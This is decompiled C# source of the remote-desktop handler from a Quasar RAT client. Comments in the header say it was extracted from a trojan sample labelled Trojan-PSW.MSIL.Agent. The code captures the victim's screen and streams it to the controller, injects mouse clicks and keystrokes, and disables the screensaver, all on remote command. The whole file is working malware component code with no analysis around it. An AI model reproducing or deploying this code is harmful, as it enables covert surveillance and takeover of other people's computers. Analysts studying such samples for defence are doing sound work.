// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Messages.RemoteDesktopHandler
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Helper;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Video;
using Quasar.Common.Video.Codecs;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
  public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
  {
    private UnsafeStreamCodec _streamCodec;

    public override bool CanExecute(IMessage message)
    {
      switch (message)
      {
        case GetDesktop _:
        case DoMouseEvent _:
        case DoKeyboardEvent _:
          return true;
        default:
          return message is GetMonitors;
      }
    }

    public override bool CanExecuteFrom(ISender sender) => true;

    public override void Execute(ISender sender, IMessage message)
    {
      switch (message)
      {
        case GetDesktop message1:
          this.Execute(sender, message1);
          break;
        case DoMouseEvent message2:
          this.Execute(sender, message2);
          break;
        case DoKeyboardEvent message3:
          this.Execute(sender, message3);
          break;
        case GetMonitors message4:
          this.Execute(sender, message4);
          break;
      }
    }

    private void Execute(ISender client, GetDesktop message)
    {
      Rectangle bounds = ScreenHelper.GetBounds(message.DisplayIndex);
      Resolution resolution = new Resolution()
      {
        Height = bounds.Height,
        Width = bounds.Width
      };
      if (this._streamCodec == null)
        this._streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
      if (message.CreateNew)
      {
        this._streamCodec?.Dispose();
        this._streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
        this.OnReport("Remote desktop session started");
      }
      if (this._streamCodec.ImageQuality != message.Quality || this._streamCodec.Monitor != message.DisplayIndex || this._streamCodec.Resolution != resolution)
      {
        this._streamCodec?.Dispose();
        this._streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
      }
      BitmapData bitmapdata = (BitmapData) null;
      Bitmap bitmap = (Bitmap) null;
      try
      {
        bitmap = ScreenHelper.CaptureScreen(message.DisplayIndex);
        bitmapdata = bitmap.LockBits(new Rectangle(0, 0, bitmap.Width, bitmap.Height), ImageLockMode.ReadWrite, bitmap.PixelFormat);
        using (MemoryStream outStream = new MemoryStream())
        {
          if (this._streamCodec == null)
            throw new Exception("StreamCodec can not be null.");
          this._streamCodec.CodeImage(bitmapdata.Scan0, new Rectangle(0, 0, bitmap.Width, bitmap.Height), new Size(bitmap.Width, bitmap.Height), bitmap.PixelFormat, (Stream) outStream);
          client.Send<GetDesktopResponse>(new GetDesktopResponse()
          {
            Image = outStream.ToArray(),
            Quality = this._streamCodec.ImageQuality,
            Monitor = this._streamCodec.Monitor,
            Resolution = this._streamCodec.Resolution
          });
        }
      }
      catch (Exception ex)
      {
        if (this._streamCodec != null)
          client.Send<GetDesktopResponse>(new GetDesktopResponse()
          {
            Image = (byte[]) null,
            Quality = this._streamCodec.ImageQuality,
            Monitor = this._streamCodec.Monitor,
            Resolution = this._streamCodec.Resolution
          });
        this._streamCodec = (UnsafeStreamCodec) null;
      }
      finally
      {
        if (bitmap != null)
        {
          if (bitmapdata != null)
          {
            try
            {
              bitmap.UnlockBits(bitmapdata);
            }
            catch
            {
            }
          }
          bitmap.Dispose();
        }
      }
    }

    private void Execute(ISender sender, DoMouseEvent message)
    {
      try
      {
        Screen[] allScreens = Screen.AllScreens;
        int x = allScreens[message.MonitorIndex].Bounds.X;
        int y = allScreens[message.MonitorIndex].Bounds.Y;
        Point p = new Point(message.X + x, message.Y + y);
        switch (message.Action)
        {
          case MouseAction.LeftDown:
          case MouseAction.LeftUp:
          case MouseAction.RightDown:
          case MouseAction.RightUp:
          case MouseAction.MoveCursor:
            if (NativeMethodsHelper.IsScreensaverActive())
            {
              NativeMethodsHelper.DisableScreensaver();
              break;
            }
            break;
        }
        switch (message.Action)
        {
          case MouseAction.LeftDown:
          case MouseAction.LeftUp:
            NativeMethodsHelper.DoMouseLeftClick(p, message.IsMouseDown);
            break;
          case MouseAction.RightDown:
          case MouseAction.RightUp:
            NativeMethodsHelper.DoMouseRightClick(p, message.IsMouseDown);
            break;
          case MouseAction.MoveCursor:
            NativeMethodsHelper.DoMouseMove(p);
            break;
          case MouseAction.ScrollUp:
            NativeMethodsHelper.DoMouseScroll(p, false);
            break;
          case MouseAction.ScrollDown:
            NativeMethodsHelper.DoMouseScroll(p, true);
            break;
        }
      }
      catch
      {
      }
    }

    private void Execute(ISender sender, DoKeyboardEvent message)
    {
      if (NativeMethodsHelper.IsScreensaverActive())
        NativeMethodsHelper.DisableScreensaver();
      NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
    }

    private void Execute(ISender client, GetMonitors message) => client.Send<GetMonitorsResponse>(new GetMonitorsResponse()
    {
      Number = Screen.AllScreens.Length
    });

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      this._streamCodec?.Dispose();
    }
  }
}
